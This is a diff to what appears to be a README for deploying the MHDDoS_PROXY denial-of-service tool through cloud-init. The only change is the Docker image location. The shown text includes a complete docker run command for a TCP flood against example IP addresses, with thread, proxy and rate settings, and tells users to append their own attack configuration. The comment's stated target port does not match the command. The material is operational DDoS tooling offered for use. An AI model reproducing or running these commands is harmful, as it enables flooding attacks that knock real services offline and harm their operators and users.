@@ -117,12 +117,12 @@ runcmd:
 ```
 More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
  - For [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) 
-    `"docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy` part of command is static and must be preserved.   
+    `"docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy` part of command is static and must be preserved.   
     All your customizations must follow this command as in example below:
 ```yaml
 # TCP flood attack on ip 1.1.1.1, port 80, 3000 threads per core, proxy refresh every 300 seconds, requests per proxy 50
 runcmd:
-  - "docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
+  - "docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
 # here 'tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug' is your attack configuration that fully compliant with MHDDOS_PROXY
 ```
 Save the `cloud-init.yaml` file.
